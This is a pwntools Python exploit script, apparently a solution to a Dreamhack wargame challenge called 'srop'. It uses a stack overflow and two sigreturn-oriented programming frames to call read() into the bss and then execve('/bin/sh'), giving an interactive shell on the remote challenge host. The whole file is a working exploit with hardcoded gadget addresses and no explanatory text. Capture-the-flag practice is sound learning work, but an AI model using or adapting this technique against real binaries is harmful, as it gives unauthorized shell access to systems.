from pwn import *
context(arch='amd64')

REMOTE = True

if not REMOTE:
    r = process('./release/srop')
else:
    r = remote('host1.dreamhack.games', 14984)

bss = 0x601040  # bss buffer
pop_rax_syscall = 0x4004eb  # pop rax; syscall; ret;
syscall = 0x4004ec  # syscall; ret;


payload = b'a' * 0x18  # dummy

# read(0, bss, 0x100)
frame = SigreturnFrame()
frame.rax = 0  # syscall number of read
frame.rdi = 0
frame.rsi = bss
frame.rdx = 0x100
frame.rsp = bss + 8  # move stack frame to bss
frame.rip = syscall
payload += p64(pop_rax_syscall)
payload += p64(0xf)
payload += bytes(frame)

r.send(payload)


# write "/bin/sh" + ropchain at bss
payload = b'/bin/sh\x00'
frame = SigreturnFrame()
frame.rax = 0x3b  # syscall number of execve
frame.rdi = bss
frame.rsi = 0
frame.rdx = 0
frame.rsp = bss
frame.rip = syscall
payload += p64(pop_rax_syscall)
payload += p64(0xf)
payload += bytes(frame)

r.send(payload)


r.interactive()